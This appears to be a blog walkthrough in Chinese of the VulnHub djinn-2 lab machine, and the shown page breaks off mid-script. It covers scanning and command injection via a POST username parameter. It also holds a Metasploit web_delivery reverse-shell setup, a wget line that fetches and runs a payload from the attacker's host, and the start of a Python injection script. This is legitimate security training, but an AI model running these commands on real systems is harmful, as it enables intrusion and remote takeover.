@@ -1,0 +1,446 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>djinn-2靶机练习 | dummersoul's Blog</title><meta name="keywords" content="靶机,vulnhub,内网提权"><meta name="author" content="dummersoul"><meta name="copyright" content="dummersoul"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><meta name="description" content="靶机位置：https:&#x2F;&#x2F;www.vulnhub.com&#x2F;entry&#x2F;djinn-2,420&#x2F; 主机发现123arp-scan -lnetdiscovernmap -sP 192.168.56.0&#x2F;24  端口探测1nmap -p- -A 192.168.56.109  同样发现了与靶机1一样的ftp匿名登录，里面也是三个文件，文件名一样，不过内容变了    port state service">
+<meta property="og:type" content="article">
+<meta property="og:title" content="djinn-2靶机练习">
+<meta property="og:url" content="https://dummersoul.github.io/2023/11/28/djinn-2%E9%9D%B6%E6%9C%BA%E7%BB%83%E4%B9%A0/index.html">
+<meta property="og:site_name" content="dummersoul&#39;s Blog">
+<meta property="og:description" content="靶机位置：https:&#x2F;&#x2F;www.vulnhub.com&#x2F;entry&#x2F;djinn-2,420&#x2F; 主机发现123arp-scan -lnetdiscovernmap -sP 192.168.56.0&#x2F;24  端口探测1nmap -p- -A 192.168.56.109  同样发现了与靶机1一样的ftp匿名登录，里面也是三个文件，文件名一样，不过内容变了    port state service">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://dummersoul.github.io/img/keepass.jpg">
+<meta property="article:published_time" content="2023-11-28T08:48:58.469Z">
+<meta property="article:modified_time" content="2021-01-20T03:36:44.000Z">
+<meta property="article:author" content="dummersoul">
+<meta property="article:tag" content="靶机">
+<meta property="article:tag" content="vulnhub">
+<meta property="article:tag" content="内网提权">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://dummersoul.github.io/img/keepass.jpg"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://dummersoul.github.io/2023/11/28/djinn-2%E9%9D%B6%E6%9C%BA%E7%BB%83%E4%B9%A0/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//fonts.googleapis.com" crossorigin="crossorigin"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="preconnect" href="//zz.bdstatic.com"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.css"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Titillium+Web&amp;display=swap"><script>var GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"search.xml","languages":{"hits_empty":"找不到您查询的内容：${query}"}},
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '天',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  ClickShowText: undefined,
+  lightbox: 'fancybox',
+  Snackbar: {"chs_to_cht":"你已切换为繁体","cht_to_chs":"你已切换为简体","day_to_night":"你已切换为深色模式","night_to_day":"你已切换为浅色模式","bgLight":"#49b1f5","bgDark":"#121212","position":"bottom-left"},
+  justifiedGallery: {
+    js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
+    css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isanchor: false
+};
+
+var saveToLocal = {
+  set: function setWithExpiry(key, value, ttl) {
+    const now = new Date()
+    const expiryDay = ttl * 86400000
+    const item = {
+      value: value,
+      expiry: now.getTime() + expiryDay,
+    }
+    localStorage.setItem(key, JSON.stringify(item))
+  },
+
+  get: function getWithExpiry(key) {
+    const itemStr = localStorage.getItem(key)
+
+    if (!itemStr) {
+      return undefined
+    }
+    const item = JSON.parse(itemStr)
+    const now = new Date()
+
+    if (now.getTime() > item.expiry) {
+      localStorage.removeItem(key)
+      return undefined
+    }
+    return item.value
+  }
+}</script><script id="config_change">var GLOBAL_CONFIG_SITE = { 
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2021-01-20 11:36:44'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(function () {  window.activateDarkMode = function () {
+    document.documentElement.setAttribute('data-theme', 'dark')
+    if (document.querySelector('meta[name="theme-color"]') !== null) {
+      document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+    }
+  }
+  window.activateLightMode = function () {
+    document.documentElement.setAttribute('data-theme', 'light')
+   if (document.querySelector('meta[name="theme-color"]') !== null) {
+      document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+    }
+  }
+  const autoChangeMode = 'false'
+  const t = saveToLocal.get('theme')
+  if (autoChangeMode === '1') {
+    const isDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches
+    const isLightMode = window.matchMedia('(prefers-color-scheme: light)').matches
+    const isNotSpecified = window.matchMedia('(prefers-color-scheme: no-preference)').matches
+    const hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified
+    if (t === undefined) {
+      if (isLightMode) activateLightMode()
+      else if (isDarkMode) activateDarkMode()
+      else if (isNotSpecified || hasNoSupport) {
+        const now = new Date()
+        const hour = now.getHours()
+        const isNight = hour <= 6 || hour >= 18
+        isNight ? activateDarkMode() : activateLightMode()
+      }
+      window.matchMedia('(prefers-color-scheme: dark)').addListener(function (e) {
+        if (saveToLocal.get('theme') === undefined) {
+          e.matches ? activateDarkMode() : activateLightMode()
+        }
+      })
+    } else if (t === 'light') activateLightMode()
+    else activateDarkMode()
+  } else if (autoChangeMode === '2') {
+    const now = new Date()
+    const hour = now.getHours()
+    const isNight = hour <= 6 || hour >= 18
+    if (t === undefined) isNight ? activateDarkMode() : activateLightMode()
+    else if (t === 'light') activateLightMode()
+    else activateDarkMode()
+  } else {
+    if (t === 'dark') activateDarkMode()
+    else if (t === 'light') activateLightMode()
+  }const asideStatus = saveToLocal.get('aside-status')
+if (asideStatus !== undefined) {
+   if (asideStatus === 'hide') {
+     document.documentElement.classList.add('hide-aside')
+   } else {
+     document.documentElement.classList.remove('hide-aside')
+   }
+}})()</script><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/HCLonely/images@master/others/heartbeat.min.css"><meta name="generator" content="Hexo 5.2.0"><link rel="alternate" href="/atom.xml" title="dummersoul's Blog" type="application/atom+xml">
+</head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="author-avatar"><img class="avatar-img" src="/img/dummersoul.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data"><div class="data-item is-center"><div class="data-item-link"><a href="/archives/"><div class="headline">文章</div><div class="length-num">60</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/tags/"><div class="headline">标签</div><div class="length-num">34</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 生活</span><i class="fas fa-chevron-down expand"></i></a><ul class="menus_item_child"><li><a class="site-page" href="/music/"><i class="fa-fw fas fa-music"></i><span> 音乐</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 好友链接</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于我</span></a></div></div></div></div><div id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(/img/keepass.jpg)"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">dummersoul's Blog</a></span><span id="menus"><div id="search_button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 生活</span><i class="fas fa-chevron-down expand"></i></a><ul class="menus_item_child"><li><a class="site-page" href="/music/"><i class="fa-fw fas fa-music"></i><span> 音乐</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 好友链接</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于我</span></a></div></div><span class="close" id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></span></span></nav><div id="post-info"><h1 class="post-title">djinn-2靶机练习</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-11-28T08:48:58.469Z" title="发表于 2023-11-28 16:48:58">2023-11-28</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2021-01-20T03:36:44.000Z" title="更新于 2021-01-20 11:36:44">2021-01-20</time></span></div><div class="meta-secondline"> <span class="post-meta-separator">|</span><span class="post-meta-pv-cv"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><p><strong>靶机位置</strong>：<a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/djinn-2,420/">https://www.vulnhub.com/entry/djinn-2,420/</a></p>
+<h2 id="主机发现"><a href="#主机发现" class="headerlink" title="主机发现"></a>主机发现</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">arp-scan -l</span><br><span class="line">netdiscover</span><br><span class="line">nmap -sP 192.168.56.0/24</span><br></pre></td></tr></table></figure>
+
+<h2 id="端口探测"><a href="#端口探测" class="headerlink" title="端口探测"></a>端口探测</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -p- -A 192.168.56.109</span><br></pre></td></tr></table></figure>
+
+<p>同样发现了与靶机1一样的ftp匿名登录，里面也是三个文件，文件名一样，不过内容变了</p>
+<table>
+<thead>
+<tr>
+<th>port</th>
+<th>state</th>
+<th>service</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>21</td>
+<td>open</td>
+<td>ftp</td>
+</tr>
+<tr>
+<td>22</td>
+<td>open</td>
+<td>ssh</td>
+</tr>
+<tr>
+<td>1337</td>
+<td>open</td>
+<td>waste</td>
+</tr>
+<tr>
+<td>5000</td>
+<td>open</td>
+<td>upnp</td>
+</tr>
+<tr>
+<td>7331</td>
+<td>open</td>
+<td>swx</td>
+</tr>
+</tbody></table>
+<p>这个7331端口和上一个靶机一样，再打开/wish页面，它提示漏洞已修复，也确实没有命令执行漏洞了，两个靶机怎么可能同一处利用点呢，只能尝试其他点了</p>
+<h2 id="目录扫描"><a href="#目录扫描" class="headerlink" title="目录扫描"></a>目录扫描</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirb http://192.168.56.109:7331 /usr/share/wordlists/dirb/big.txt</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<ul>
+<li><a target="_blank" rel="noopener" href="http://192.168.56.109:7331/robots.txt">http://192.168.56.109:7331/robots.txt</a> (CODE:200|SIZE:10)</li>
+<li><a target="_blank" rel="noopener" href="http://192.168.56.109:7331/source">http://192.168.56.109:7331/source</a> (CODE:200|SIZE:1280)</li>
+<li><a target="_blank" rel="noopener" href="http://192.168.56.109:7331/wish">http://192.168.56.109:7331/wish</a> (CODE:200|SIZE:456)</li>
+</ul>
+</blockquote>
+<p>扫描到了一个新目录/source,一访问结果下载下来了</p>
+<p>source内容：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">URL = <span class="string">&quot;http://&#123;&#125;:5000/?username=&#123;&#125;&amp;password=&#123;&#125;&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check_ip</span>(<span class="params">ip: <span class="built_in">str</span></span>):</span></span><br><span class="line"></span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Check whether the input IP is valid or not</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> re.match(<span class="string">r&#x27;^(?:(25[0-5]|2[0-4][0-9]|1[0-9][0-9]|[1-9][0-9]|[0-9])&#x27;</span></span><br><span class="line"></span><br><span class="line">                <span class="string">&#x27;(\.(?!$)|$))&#123;4&#125;$&#x27;</span>, ip):</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">catcher</span>(<span class="params">host, username, password</span>):</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line"></span><br><span class="line">        url = URL.<span class="built_in">format</span>(host, username, password)</span><br><span class="line"></span><br><span class="line">        requests.post(url)</span><br><span class="line"></span><br><span class="line">        sleep(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line"></span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    print(<span class="string">&quot;Unable to connect to the server!!&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line"></span><br><span class="line">    print(<span class="string">&quot;If you have this then congratulations on being a part of an awesome organization&quot;</span>)</span><br><span class="line"></span><br><span class="line">    print(<span class="string">&quot;This key will help you in connecting to our system securely.&quot;</span>)</span><br><span class="line"></span><br><span class="line">    print(<span class="string">&quot;If you find any issue please report it to ugtan@djinn.io&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    ip = <span class="built_in">input</span>(<span class="string">&#x27;\nIP of the machine: &#x27;</span>)</span><br><span class="line"></span><br><span class="line">    username = <span class="built_in">input</span>(<span class="string">&#x27;Your username: &#x27;</span>)</span><br><span class="line"></span><br><span class="line">    password = <span class="built_in">input</span>(<span class="string">&#x27;Your password: &#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ip <span class="keyword">and</span> check_ip(ip) <span class="keyword">and</span> username == <span class="string">&quot;REDACTED&quot;</span> <span class="keyword">and</span> password == <span class="string">&quot;REDACTED&quot;</span>:</span><br><span class="line"></span><br><span class="line">        print(<span class="string">&quot;Verifiying %s with host %s &quot;</span> % (username, ip))</span><br><span class="line"></span><br><span class="line">        catcher(ip, username, password)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line"></span><br><span class="line">        print(<span class="string">&quot;Invalid IP address given&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line"></span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
+
+<p>其中有一个重要的信息</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">URL &#x3D; &quot;http:&#x2F;&#x2F;&#123;&#125;:5000&#x2F;?username&#x3D;&#123;&#125;&amp;password&#x3D;&#123;&#125;&quot;</span><br></pre></td></tr></table></figure>
+
+<p>这是提示5000端口可以利用</p>
+<h2 id="网页枚举"><a href="#网页枚举" class="headerlink" title="网页枚举"></a>网页枚举</h2><p>赶紧访问5000端口查看</p>
+<p><a target="_blank" rel="noopener" href="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210113163918412.png"><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210113163918412.png" alt="image-20210113163918412"></a></p>
+<p>翻译一下：“所请求的URL不允许使用该方法”。</p>
+<p>当前什么方法？GET啊，那就换POST</p>
+<p>在刚才发现的源代码中也能看到是post请求 <code>requests.post(url)</code></p>
+<blockquote>
+<p>如果想要验证是什么访问方式，可以用OPTIONS方式进行访问</p>
+<p><a target="_blank" rel="noopener" href="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210114100046670.png"><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210114100046670.png" alt="image-20210114100046670"></a></p>
+<p>显示允许的方式为POST</p>
+<p>OPTIONS请求其实是一次预检，只有非简单请求会预检。这一部分详细请参考<a target="_blank" rel="noopener" href="https://www.jianshu.com/p/5cf82f092201">http跨域时的options请求</a></p>
+</blockquote>
+<p><a target="_blank" rel="noopener" href="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210114093126207.png"><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210114093126207.png" alt="image-20210114093126207"></a></p>
+<blockquote>
+<p>这里特别注意一点：虽然是post请求，但是不能把参数放在下面，而是在url里</p>
+</blockquote>
+<p>返回200，但是什么内容也没有，是不是用户名和密码错误，根据源代码中</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if ip and check_ip(ip) and username &#x3D;&#x3D; &quot;REDACTED&quot; and password &#x3D;&#x3D; &quot;REDACTED&quot;</span><br></pre></td></tr></table></figure>
+
+<p>再试一次</p>
+<p><a target="_blank" rel="noopener" href="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210114093456987.png"><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210114093456987.png" alt="image-20210114093456987"></a></p>
+<p>嘿，结果一样啊，那怎么利用？</p>
+<blockquote>
+<p>这里就需要发散思维求解了，由于这个靶机跟上一个内容一样，利用点不一样，但是利用方式可能是类似的，会不会也是命令执行漏洞呢，那么如何将命令传送给系统呢，大胆假设，在用户名和密码的位置输入代码。</p>
+</blockquote>
+<p><a target="_blank" rel="noopener" href="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210114093835863.png"><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210114093835863.png" alt="image-20210114093835863"></a></p>
+<p>通过测试，发现只在用户名处存在<code>RCE</code>漏洞（<strong>remote command/code execute</strong>），也叫远程代码/命令执行</p>
+<h2 id="curl-X"><a href="#curl-X" class="headerlink" title="curl -X"></a>curl -X</h2><p>这里也可以用curl执行,一样的效果</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -X POST <span class="string">&#x27;192.168.56.109:5000/?username=id&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210114105249792.png"><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210114105249792.png" alt="image-20210114105249792"></a></p>
+<blockquote>
+<p>-X 是指定请求的方式为GET还是POST</p>
+</blockquote>
+<h2 id="RCE-getshell"><a href="#RCE-getshell" class="headerlink" title="RCE getshell"></a>RCE getshell</h2><p>有了利用点，接下来又是紧张又刺激的反弹shell环节</p>
+<p>那就试一下跟上一个靶机一样的方式</p>
+<p>结果不行，应该是过滤掉了，也是啊，上一个方法怎么还能重复使用呢</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl -X POST <span class="string">&#x27;192.168.56.109:5000/?username=ls&#x27;</span>   <span class="comment"># 有一个文件app.py</span></span><br><span class="line">curl -X POST <span class="string">&#x27;192.168.56.109:5000/?username=cat%20app.py&#x27;</span>    <span class="comment"># 查看文件</span></span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210114110319007.png"><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210114110319007.png" alt="image-20210114110319007"></a></p>
+<p>发现过滤了 <code>|</code> ，所以base64解码的时候靠连接符拼接语句是失败的</p>
+<h3 id="法一：msf——web-delivery"><a href="#法一：msf——web-delivery" class="headerlink" title="法一：msf——web_delivery"></a>法一：msf——web_delivery</h3><p>利用<strong>web_delivery</strong>模块</p>
+<blockquote>
+<p>目标设备存在<code>远程文件包含漏洞</code>或者<code>命令注入漏洞</code>，想在目标设备上加载webshell，但不想在目标设备硬盘上留下任何webshell文件信息都可以用这个模块。（远程包含直接访问远程链接）</p>
+<p>原理：让目标设备从远端服务器加载webshell代码至内存执行</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">use exploit/multi/script/web_delivery</span><br><span class="line"><span class="built_in">set</span> target 6     <span class="comment"># show targets 后选择一个</span></span><br><span class="line"><span class="built_in">set</span> payload linux/x64/meterpreter/reverse_tcp  <span class="comment"># 必须依据target来自己设定payload</span></span><br><span class="line"><span class="built_in">set</span> lhost 192.168.56.123</span><br><span class="line">exploit -j -z</span><br></pre></td></tr></table></figure>
+
+<p>运行后会出现一行代码，教你怎么利用</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget -qO esP1RoPD --no-check-certificate http://192.168.56.123:8080/obwKswSG; chmod +x esP1RoPD; ./esP1RoPD&amp; <span class="built_in">disown</span></span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210114115245841.png"><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210114115245841.png" alt="image-20210114115245841"></a></p>
+<p>他这个意思是：先下载下来一个文件，再设置权限，执行，就可以反弹了</p>
+<blockquote>
+<p>需要注意：-qO 后是下载输出的位置，一定要放在<code>/tmp</code>目录下，不然会消失。</p>
+<p>url的空格可以是%20 也可以是’+’ 我个人喜欢’+’ 看起来很舒服</p>
+</blockquote>
+<p><a target="_blank" rel="noopener" href="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210114114638118.png"><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210114114638118.png" alt="image-20210114114638118"></a></p>
+<p><a target="_blank" rel="noopener" href="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210114115857078.png"><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210114115857078.png" alt="image-20210114115857078"></a></p>
+<p>可以看到下载成功了，然后增加执行权限，执行反弹shell</p>
+<p><a target="_blank" rel="noopener" href="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210114124818575.png"><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210114124818575.png" alt="image-20210114124818575"></a></p>
+<h3 id="法二：py脚本"><a href="#法二：py脚本" class="headerlink" title="法二：py脚本"></a>法二：py脚本</h3><p>kali下新建一个1.py</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">byteEncode</span>(<span class="params">string</span>):</span></span><br><span class="line">	result = <span class="string">&quot;&quot;</span></span><br><span class="line">	<span class="keyword">for</span> c <span class="keyword">in</span> string:</span><br><span class="line">		result += <span class="string">&quot;\\x&quot;</span> + c.encode(<span class="string">&quot;hex&quot;</span>)</span><br><span class="line">	<span class="keyword">return</span> result</span><br><span class="line">		</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">	target_address = <span class="string">&quot;192.168.56.109:5000&quot;</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">while</span>(<span class="literal">True</span>):</span><br><span class="line">		cmd = raw_input(<span class="string">&quot;$ &quot;</span>)</span><br><span class="line">		cmd = byteEncode(cmd)</span><br><span class="line">		cmd = <span class="string">&#x27;env printf &quot;&#x27;</span>+cmd+<span class="string">&#x27;&quot;&#x27;</span></span><br><span class="line">		params = &#123;<span class="string">&quot;username&quot;</span> : <span class="string">&#x27;echo `&#x27;</span> + cmd  + <span class="string">&#x27;` &gt; /tmp/tmp.sh &amp;&amp; chmod +x /tmp/tmp.sh 